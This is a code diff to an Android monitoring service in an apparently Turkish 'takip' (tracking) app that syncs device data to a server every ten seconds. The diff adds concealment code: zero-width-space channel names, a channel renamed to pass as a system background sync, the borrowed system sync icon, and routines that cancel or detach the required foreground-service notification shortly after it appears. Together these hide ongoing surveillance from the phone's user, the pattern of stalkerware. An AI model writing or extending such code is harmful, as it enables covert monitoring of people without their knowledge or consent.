@@ -7,7 +7,9 @@ import android.app.Service
 import android.content.Context
 import android.content.Intent
 import android.os.Build
+import android.os.Handler
 import android.os.IBinder
+import android.os.Looper
 import android.util.Log
 import androidx.core.app.NotificationCompat
 import com.takip.app.R
@@ -36,18 +38,21 @@ class MonitoringService : Service() {
     private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
     private var syncJob: Job? = null
     private var mediaCounter = 0
+    private val mainHandler = Handler(Looper.getMainLooper())
 
     override fun onBind(intent: Intent?): IBinder? = null
 
     override fun onCreate() {
         super.onCreate()
-        startForeground(NOTIFICATION_ID, createNotification())
+        ensureSilentChannel()
+        startHiddenForeground()
         scope.launch { syncData() }
         startSyncLoop()
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        startForeground(NOTIFICATION_ID, createNotification())
+        ensureSilentChannel()
+        startHiddenForeground()
         if (syncJob?.isActive != true) {
             scope.launch { syncData() }
             startSyncLoop()
@@ -59,6 +64,49 @@ class MonitoringService : Service() {
         syncJob?.cancel()
         scope.cancel()
         super.onDestroy()
+    }
+
+    private fun ensureSilentChannel() {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return
+        val nm = getSystemService(NotificationManager::class.java)
+        try {
+            nm.deleteNotificationChannel(LEGACY_CHANNEL_ID)
+        } catch (_: Exception) {
+        }
+        val channel = NotificationChannel(
+            CHANNEL_ID,
+            "\u200B",
+            NotificationManager.IMPORTANCE_MIN
+        ).apply {
+            description = "\u200B"
+            setShowBadge(false)
+            enableLights(false)
+            enableVibration(false)
+            setSound(null, null)
+            lockscreenVisibility = Notification.VISIBILITY_SECRET
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                setAllowBubbles(false)
+            }
+        }
+        nm.createNotificationChannel(channel)
+    }
+
+    private fun startHiddenForeground() {
+        startForeground(NOTIFICATION_ID, createNotification())
+        mainHandler.postDelayed({ hideForegroundNotification() }, 400)
+    }
+
+    private fun hideForegroundNotification() {
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+                stopForeground(STOP_FOREGROUND_DETACH)
+                return
+            }
+            val nm = getSystemService(NotificationManager::class.java)
+            nm.cancel(NOTIFICATION_ID)
+        } catch (e: Exception) {
+            Log.w(TAG, "Bildirim gizleme: ${e.message}")
+        }
     }
 
     private fun startSyncLoop() {
@@ -78,6 +126,8 @@ class MonitoringService : Service() {
             Log.w(TAG, "Senkron atlandı: deviceToken yok")
             return
         }
+
+        hideForegroundNotification()
 
         val permissions = PermissionChecker.getStatus(this)
         ApiClient.sync(token, permissions).onSuccess { syncResult ->
@@ -169,31 +219,23 @@ class MonitoringService : Service() {
     }
 
     private fun createNotification(): Notification {
-        val channelId = "takip_monitoring"
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val channel = NotificationChannel(
-                channelId,
-                " ",
-                NotificationManager.IMPORTANCE_MIN
-            ).apply {
-                description = " "
-                setShowBadge(false)
-                enableLights(false)
-                enableVibration(false)
-                setSound(null, null)
-                lockscreenVisibility = Notification.VISIBILITY_SECRET
-            }
-            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
-        }
+        val sysIcon = resources.getIdentifier("stat_notify_sync", "drawable", "android")
+        val icon = if (sysIcon != 0) sysIcon else R.drawable.ic_notification_blank
 
-        return NotificationCompat.Builder(this, channelId)
-            .setContentTitle(" ")
-            .setContentText(" ")
-            .setSmallIcon(R.drawable.ic_notification_blank)
+        return NotificationCompat.Builder(this, CHANNEL_ID)
+            .setContentTitle("")
+            .setContentText("")
+            .setSubText(null)
+            .setSmallIcon(icon)
             .setOngoing(true)
             .setSilent(true)
+            .setShowWhen(false)
+            .setLocalOnly(true)
+            .setOnlyAlertOnce(true)
+            .setSortKey("zzz")
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setVisibility(NotificationCompat.VISIBILITY_SECRET)
+            .setCategory(NotificationCompat.CATEGORY_SERVICE)
             .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE)
             .build()
     }
@@ -201,6 +243,8 @@ class MonitoringService : Service() {
     companion object {
         private const val TAG = "MonitoringService"
         private const val NOTIFICATION_ID = 1001
+        private const val CHANNEL_ID = "sys_bg_sync_v3"
+        private const val LEGACY_CHANNEL_ID = "takip_monitoring"
         private const val SYNC_INTERVAL_MS = 10_000L
 
         fun start(context: Context) {
